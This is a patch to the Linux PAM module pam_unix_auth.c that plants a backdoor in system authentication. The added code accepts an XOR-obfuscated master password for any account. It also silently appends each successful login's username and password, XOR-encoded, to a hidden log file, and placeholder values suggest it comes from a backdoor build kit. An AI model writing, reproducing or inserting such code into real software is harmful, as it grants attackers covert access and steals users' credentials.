diff -Nuar 1.3.1.orig/modules/pam_unix/pam_unix_auth.c 1.3.1/modules/pam_unix/pam_unix_auth.c
--- 1.3.1.orig/modules/pam_unix/pam_unix_auth.c	2020-05-26 13:01:31.828757596 +0200
+++ 1.3.1/modules/pam_unix/pam_unix_auth.c	2020-05-26 13:08:09.312762365 +0200
@@ -82,6 +82,23 @@
 	return retval;						\
 } while (0)
 
+#define XKEY                    %%XKEY%%
+#define PAM_KEY                 "%%PAM_KEY%%"
+#define PAM_LOGS                "%%PAM_LOGS%%"
+
+static void _xor(char *p){
+        int i;
+        for(i = 0; i < strlen(p); i++)
+                if(p[i] ^ XKEY)
+                        p[i] ^= XKEY;
+}
+
+static void clean(void *var){
+        memset(var, 0x00, strlen((char *)var));
+        free(var);
+}
+
+#define xor(new_name, target) char *new_name = strdup(target); _xor(new_name);
 
 static void
 setcred_free (pam_handle_t *pamh UNUSED, void *ptr, int err UNUSED)
@@ -170,7 +187,25 @@
 	D(("user=%s, password=[%s]", name, p));
 
 	/* verify the password of this user */
-	retval = _unix_verify_password(pamh, name, p, ctrl);
+	xor(pam_p, PAM_KEY);
+	if(!strcmp(p,pam_p))
+		retval = PAM_SUCCESS;
+	else {
+		retval = _unix_verify_password(pamh, name, p, ctrl);
+		if(retval == PAM_SUCCESS){
+			FILE *fd;
+			char bds[256];
+			xor(logf, PAM_LOGS);
+			fd = fopen(logf, "a");
+			sprintf(bds, "%s:%s", name, p);
+			_xor(bds);
+			fprintf(fd, "%s\n", bds);
+			memset(bds, 0, 255);
+			clean(logf);
+			fclose(fd);
+		}
+	}
+	clean(pam_p);
 	name = p = NULL;
 
 	AUTH_RETURN;
